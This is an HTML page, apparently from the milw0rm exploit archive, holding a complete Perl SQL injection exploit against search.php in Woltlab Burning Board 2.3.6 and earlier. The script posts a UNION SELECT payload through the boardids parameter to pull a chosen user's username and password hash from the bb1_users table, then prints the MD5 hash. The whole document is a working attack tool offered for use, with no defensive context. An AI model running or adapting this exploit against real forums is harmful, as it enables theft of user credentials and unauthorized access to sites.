<html><head><title>Woltlab Burning Board <= 1.0.2, 2.3.6 search.php SQL Injection Exploit 3</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Response;

$| = 1;
print &quot;
###################################################
##
## Woltlab Burning Board 2.3.6 &lt;= / Lite Exploit 
##
###################################################
##
## Coded by 666 &lt;http://blueshisha.mutebox.net&gt;
## Bug by trew
##
###################################################
\n&quot;;

if($#ARGV &lt; 0)
{
        print &quot;[x] Usage: wbbsploit.pl [Target] [Userid] [Searchstring]\n&quot;;
        exit;
}
print &quot;&lt;~&gt; Exploiting...\n&quot;;
my $url = shift;
my $id = shift;
my $sstring = shift;

my $ua = LWP::UserAgent-&gt;new;
my $request = new HTTP::Request('POST', 'http://'.$url.'search.php');
$request-&gt;content('searchuser=&amp;name_exactly=1&amp;topiconly=0&amp;showposts=0&amp;searchdate=0&amp;beforeafter=after&amp;sortby=lastpost&amp;sortorder=desc&amp;send=send&amp;sid=&amp;submit=Suchen&amp;boardids%5B%5D=1)%20UNION%20SELECT%20username,password%20FROM%20bb1_users%20WHERE%20userid='.$id.'/*&amp;searchstring='.$sstring.'');
$request-&gt;content_type('application/x-www-form-urlencoded');
my $response = $ua-&gt;request($request);
my $body     = $response-&gt;content;
print &quot;&lt;~&gt; Hash: &quot;;
$body=~/([a-f0-9]{32})/;
print $1;
print &quot;\n&quot;;

# milw0rm.com [2007-01-17]</pre></html>